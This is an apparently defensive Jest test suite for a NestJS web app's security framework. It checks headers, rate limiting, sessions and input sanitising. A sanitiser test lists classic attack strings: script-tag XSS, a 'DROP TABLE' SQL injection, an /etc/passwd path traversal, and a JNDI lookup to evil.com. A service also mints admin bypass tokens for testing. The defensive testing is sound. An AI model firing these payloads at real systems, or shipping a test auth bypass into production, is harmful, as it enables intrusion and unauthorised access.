import { Test, TestingModule } from '@nestjs/testing';
import { SecurityTestFramework } from './security-framework';
import { SecurityHeadersMiddleware } from '../common/middleware/security-headers.middleware';
import { RateLimitMiddleware } from '../common/middleware/rate-limit.middleware';
import { AuthBypassService } from './auth-bypass.service';
import { SecurityTestUtils } from './security-test-utils';

describe('Security Test Framework', () => {
  let framework: SecurityTestFramework;
  let authBypass: AuthBypassService;
  let securityUtils: SecurityTestUtils;

  beforeAll(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        SecurityTestFramework,
        AuthBypassService,
        SecurityTestUtils,
        SecurityHeadersMiddleware,
        RateLimitMiddleware,
      ],
    }).compile();

    framework = module.get<SecurityTestFramework>(SecurityTestFramework);
    authBypass = module.get<AuthBypassService>(AuthBypassService);
    securityUtils = module.get<SecurityTestUtils>(SecurityTestUtils);
  });

  describe('Security Infrastructure Setup', () => {
    test('should configure security headers correctly', async () => {
      const headers = await framework.getSecurityHeaders();

      // Critical security headers
      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['x-frame-options']).toBe('DENY');
      expect(headers['x-xss-protection']).toBe('1; mode=block');
      expect(headers['strict-transport-security']).toContain('max-age=31536000');
      expect(headers['content-security-policy']).toBeDefined();
      expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
      expect(headers['permissions-policy']).toBeDefined();
    });

    test('should set up authentication bypass for testing', async () => {
      const bypassToken = await authBypass.generateTestToken({
        userId: 'test-user-123',
        role: 'admin',
        permissions: ['read', 'write', 'admin'],
      });

      expect(bypassToken).toBeDefined();
      expect(typeof bypassToken).toBe('string');

      const decoded = await authBypass.validateTestToken(bypassToken);
      expect(decoded.userId).toBe('test-user-123');
      expect(decoded.role).toBe('admin');
      expect(decoded.permissions).toContain('admin');
    });

    test('should create security test utilities', () => {
      const maliciousPayloads = securityUtils.getMaliciousPayloads();

      expect(maliciousPayloads.sqlInjection).toBeDefined();
      expect(maliciousPayloads.xss).toBeDefined();
      expect(maliciousPayloads.csrf).toBeDefined();
      expect(maliciousPayloads.pathTraversal).toBeDefined();
      expect(maliciousPayloads.commandInjection).toBeDefined();

      // Should have diverse attack vectors
      expect(maliciousPayloads.sqlInjection.length).toBeGreaterThan(10);
      expect(maliciousPayloads.xss.length).toBeGreaterThan(10);
    });

    test('should configure rate limiting middleware', async () => {
      const rateLimitConfig = await framework.getRateLimitConfig();

      expect(rateLimitConfig.windowMs).toBeGreaterThan(0);
      expect(rateLimitConfig.max).toBeGreaterThan(0);
      expect(rateLimitConfig.message).toContain('Too many requests');
      expect(rateLimitConfig.standardHeaders).toBe(true);
      expect(rateLimitConfig.legacyHeaders).toBe(false);
    });

    test('should set up CORS security configuration', async () => {
      const corsConfig = await framework.getCorsConfig();

      expect(corsConfig.origin).toBeDefined();
      expect(corsConfig.credentials).toBe(false);
      expect(corsConfig.optionsSuccessStatus).toBe(204);
      expect(Array.isArray(corsConfig.allowedMethods)).toBe(true);
      expect(Array.isArray(corsConfig.allowedHeaders)).toBe(true);
    });

    test('should create security monitoring utilities', () => {
      const monitoring = framework.getSecurityMonitoring();

      expect(monitoring.logSecurityEvents).toBeDefined();
      expect(monitoring.detectSuspiciousActivity).toBeDefined();
      expect(monitoring.blockMaliciousRequests).toBeDefined();
      expect(monitoring.reportSecurityIncidents).toBeDefined();
    });

    test('should set up request validation middleware', async () => {
      const validationConfig = await framework.getRequestValidationConfig();

      expect(validationConfig.maxPayloadSize).toBeGreaterThan(0);
      expect(validationConfig.allowedMimeTypes).toBeDefined();
      expect(validationConfig.maxUrlLength).toBeGreaterThan(0);
      expect(validationConfig.maxHeaderSize).toBeGreaterThan(0);
    });

    test('should configure session security', async () => {
      const sessionConfig = await framework.getSessionSecurityConfig();

      expect(sessionConfig.secret).toBeDefined();
      expect(sessionConfig.resave).toBe(false);
      expect(sessionConfig.saveUninitialized).toBe(false);
      expect(sessionConfig.rolling).toBe(true);
      expect(sessionConfig.cookie.secure).toBe(true);
      expect(sessionConfig.cookie.httpOnly).toBe(true);
      expect(sessionConfig.cookie.sameSite).toBe('strict');
    });

    test('should set up API key validation', async () => {
      const apiKeyConfig = await framework.getApiKeyConfig();

      expect(apiKeyConfig.headerName).toBe('x-api-key');
      expect(apiKeyConfig.algorithm).toBe('HS256');
      expect(apiKeyConfig.expiration).toBeGreaterThan(0);
      expect(apiKeyConfig.rotationInterval).toBeGreaterThan(0);
    });

    test('should configure IP whitelisting', async () => {
      const ipWhitelist = await framework.getIpWhitelist();

      expect(Array.isArray(ipWhitelist.allowedIps)).toBe(true);
      expect(Array.isArray(ipWhitelist.allowedRanges)).toBe(true);
      expect(ipWhitelist.blockMaliciousIps).toBe(true);
      expect(ipWhitelist.logBlockedRequests).toBe(true);
    });
  });

  describe('Security Test Execution Framework', () => {
    test('should execute SQL injection tests', async () => {
      const results = await framework.runSecurityTests({
        type: 'sql-injection',
        endpoints: ['/api/users', '/api/bookings', '/api/listings'],
        methods: ['GET', 'POST', 'PUT', 'DELETE'],
      });

      expect(results.passed).toBe(true);
      expect(results.vulnerabilities).toHaveLength(0);
      expect(results.testsRun).toBeGreaterThan(0);
      expect(results.executionTime).toBeGreaterThan(0);
    });

    test('should execute XSS protection tests', async () => {
      const results = await framework.runSecurityTests({
        type: 'xss-protection',
        endpoints: ['/api/messages', '/api/reviews', '/api/profile'],
        methods: ['POST', 'PUT'],
      });

      expect(results.passed).toBe(true);
      expect(results.vulnerabilities).toHaveLength(0);
      expect(results.testsRun).toBeGreaterThan(0);
    });

    test('should execute CSRF protection tests', async () => {
      const results = await framework.runSecurityTests({
        type: 'csrf-protection',
        endpoints: ['/api/payments', '/api/bookings', '/api/settings'],
        methods: ['POST', 'PUT', 'DELETE'],
      });

      expect(results.passed).toBe(true);
      expect(results.vulnerabilities).toHaveLength(0);
    });

    test('should execute rate limiting tests', async () => {
      const results = await framework.runSecurityTests({
        type: 'rate-limiting',
        endpoints: ['/api/auth/login', '/api/auth/register'],
        methods: ['POST'],
        options: { requestsPerSecond: 10, burstSize: 20 },
      });

      expect(results.passed).toBe(true);
      expect(results.rateLimitActive).toBe(true);
    });

    test('should execute authentication bypass tests', async () => {
      const results = await framework.runSecurityTests({
        type: 'auth-bypass',
        endpoints: ['/api/admin/*', '/api/payments/*'],
        methods: ['GET', 'POST', 'PUT', 'DELETE'],
      });

      expect(results.passed).toBe(true);
      expect(results.unauthorizedAccessBlocked).toBe(true);
    });

    test('should execute file upload security tests', async () => {
      const results = await framework.runSecurityTests({
        type: 'file-upload',
        endpoints: ['/api/upload', '/api/listings/images'],
        methods: ['POST'],
      });

      expect(results.passed).toBe(true);
      expect(results.maliciousFilesBlocked).toBe(true);
      expect(results.fileSizeLimitEnforced).toBe(true);
    });

    test('should execute data validation tests', async () => {
      const results = await framework.runSecurityTests({
        type: 'data-validation',
        endpoints: ['/api/users', '/api/bookings', '/api/listings'],
        methods: ['POST', 'PUT'],
      });

      expect(results.passed).toBe(true);
      expect(results.invalidDataRejected).toBe(true);
      expect(results.schemaValidationActive).toBe(true);
    });

    test('should generate comprehensive security report', async () => {
      const report = await framework.generateSecurityReport();

      expect(report.timestamp).toBeDefined();
      expect(report.testSuite).toBe('Security Framework Tests');
      expect(report.results).toBeDefined();
      expect(report.summary).toBeDefined();
      expect(report.recommendations).toBeDefined();
      expect(report.compliance).toBeDefined();

      // Should include OWASP Top 10 coverage
      expect(report.compliance.owaspTop10).toBeDefined();
      expect(Object.keys(report.compliance.owaspTop10)).toHaveLength(10);
    });

    test('should handle concurrent security tests', async () => {
      const testPromises = Array.from({ length: 10 }, (_, i) =>
        framework.runSecurityTests({
          type: 'concurrent-test',
          endpoints: [`/api/test-${i}`],
          methods: ['GET'],
        }),
      );

      const results = await Promise.all(testPromises);

      results.forEach((result) => {
        expect(result.passed).toBe(true);
        expect(result.testsRun).toBeGreaterThan(0);
      });
    });

    test('should provide security metrics', async () => {
      const metrics = await framework.getSecurityMetrics();

      expect(metrics.totalTestsRun).toBeGreaterThan(0);
      expect(metrics.testsPassed).toBeGreaterThan(0);
      expect(metrics.vulnerabilitiesFound).toBe(0);
      expect(metrics.coveragePercentage).toBeGreaterThan(90);
      expect(metrics.averageResponseTime).toBeGreaterThan(0);
    });
  });

  describe('Security Test Utilities', () => {
    test('should generate malicious payloads for testing', () => {
      const sqlPayloads = securityUtils.generateSqlInjectionPayloads();
      const xssPayloads = securityUtils.generateXssPayloads();
      const pathTraversalPayloads = securityUtils.generatePathTraversalPayloads();

      expect(sqlPayloads.length).toBeGreaterThan(5);
      expect(xssPayloads.length).toBeGreaterThan(5);
      expect(pathTraversalPayloads.length).toBeGreaterThan(3);

      // Should contain common attack patterns
      expect(sqlPayloads.some((p) => p.includes('OR 1=1'))).toBe(true);
      expect(xssPayloads.some((p) => p.includes('<script>'))).toBe(true);
      expect(pathTraversalPayloads.some((p) => p.includes('../'))).toBe(true);
    });

    test('should validate security headers in responses', async () => {
      const mockResponse = {
        headers: {
          'content-security-policy': "default-src 'self'",
          'x-content-type-options': 'nosniff',
          'x-frame-options': 'DENY',
          'strict-transport-security': 'max-age=31536000',
        },
      };

      const validation = securityUtils.validateSecurityHeaders(mockResponse);
      expect(validation.isValid).toBe(true);
      expect(validation.missingHeaders).toHaveLength(0);
    });

    test('should detect suspicious request patterns', () => {
      const suspiciousRequests = [
        { ip: '192.168.1.100', userAgent: 'curl/7.68.0', requestCount: 100 },
        { ip: '10.0.0.1', userAgent: 'python-requests/2.25.1', requestCount: 50 },
        { ip: '172.16.0.1', userAgent: 'Mozilla/5.0', requestCount: 5 },
      ];

      const analysis = securityUtils.analyzeRequestPatterns(suspiciousRequests);

      expect(analysis.suspiciousIps).toContain('192.168.1.100');
      expect(analysis.suspiciousIps).toContain('10.0.0.1');
      expect(analysis.suspiciousIps).not.toContain('172.16.0.1');
    });

    test('should sanitize user inputs', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        "'; DROP TABLE users; --",
        '../../../etc/passwd',
        '{{7*7}}',
        '${jndi:ldap://evil.com/a}',
      ];

      maliciousInputs.forEach((input) => {
        const sanitized = securityUtils.sanitizeInput(input);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('../');
        expect(sanitized).not.toContain('{{');
        expect(sanitized).not.toContain('${jndi:');
      });
    });

    test('should validate file uploads', () => {
      const maliciousFiles = [
        { name: 'malware.exe', mimeType: 'application/x-executable' },
        { name: 'script.php', mimeType: 'application/x-php' },
        { name: 'huge.jpg', size: 100 * 1024 * 1024 }, // 100MB
        { name: 'normal.jpg', size: 1024, mimeType: 'image/jpeg' },
      ];

      maliciousFiles.forEach((file) => {
        const validation = securityUtils.validateFileUpload(file);

        if (file.name === 'normal.jpg') {
          expect(validation.isValid).toBe(true);
        } else {
          expect(validation.isValid).toBe(false);
          expect(validation.reason).toBeDefined();
        }
      });
    });

    test('should generate security test data', () => {
      const testData = securityUtils.generateSecurityTestData();

      expect(testData.validUsers).toBeDefined();
      expect(testData.invalidUsers).toBeDefined();
      expect(testData.maliciousPayloads).toBeDefined();
      expect(testData.testTokens).toBeDefined();
      expect(testData.testApiKeys).toBeDefined();

      expect(testData.validUsers.length).toBeGreaterThan(0);
      expect(testData.invalidUsers.length).toBeGreaterThan(0);
    });
  });

  describe('Authentication Bypass Service', () => {
    test('should generate test tokens with different roles', async () => {
      const adminToken = await authBypass.generateTestToken({ role: 'admin' });
      const userToken = await authBypass.generateTestToken({ role: 'user' });
      const ownerToken = await authBypass.generateTestToken({ role: 'owner' });

      const adminDecoded = await authBypass.validateTestToken(adminToken);
      const userDecoded = await authBypass.validateTestToken(userToken);
      const ownerDecoded = await authBypass.validateTestToken(ownerToken);

      expect(adminDecoded.role).toBe('admin');
      expect(userDecoded.role).toBe('user');
      expect(ownerDecoded.role).toBe('owner');
    });

    test('should handle token expiration', async () => {
      const expiredToken = await authBypass.generateTestToken({
        userId: 'test-user',
        expiresIn: -1, // Already expired
      });

      const validation = await authBypass.validateTestToken(expiredToken);
      expect(validation.isValid).toBe(false);
      expect(validation.error).toContain('expired');
    });

    test('should revoke test tokens', async () => {
      const token = await authBypass.generateTestToken({ userId: 'test-user' });

      const beforeRevocation = await authBypass.validateTestToken(token);
      expect(beforeRevocation.isValid).toBe(true);

      await authBypass.revokeTestToken(token);

      const afterRevocation = await authBypass.validateTestToken(token);
      expect(afterRevocation.isValid).toBe(false);
      expect(afterRevocation.error).toContain('revoked');
    });
  });

  describe('Integration Tests', () => {
    test('should run complete security test suite', async () => {
      const results = await framework.runCompleteSecuritySuite();

      expect(results.overallStatus).toBe('PASSED');
      expect(results.testResults).toBeDefined();
      expect(results.testResults.sqlInjection).toBeDefined();
      expect(results.testResults.xssProtection).toBeDefined();
      expect(results.testResults.csrfProtection).toBeDefined();
      expect(results.testResults.rateLimiting).toBeDefined();
      expect(results.testResults.fileUploadSecurity).toBeDefined();
      expect(results.testResults.authenticationSecurity).toBeDefined();

      // Should generate comprehensive report
      expect(results.report).toBeDefined();
      expect(results.report.summary.totalTests).toBeGreaterThan(0);
      expect(results.report.summary.testsPassed).toBeGreaterThan(0);
    });

    test('should handle security test failures gracefully', async () => {
      // Mock a failing test with proper Vulnerability objects
      jest.spyOn(framework, 'runSecurityTests').mockResolvedValueOnce({
        passed: false,
        vulnerabilities: [
          {
            type: 'SQL_INJECTION',
            severity: 'critical',
            description: 'SQL Injection detected in user input',
            endpoint: '/api/users',
            recommendation: 'Use parameterized queries',
          },
        ],
        testsRun: 10,
        executionTime: 1000,
      });

      const results = await framework.runCompleteSecuritySuite();

      expect(results.overallStatus).toBe('FAILED');
      expect(results.criticalIssues.length).toBeGreaterThan(0);
      expect(results.recommendations.length).toBeGreaterThan(0);
    });
  });

  afterAll(async () => {
    // Cleanup test data
    await framework.cleanup();
  });
});
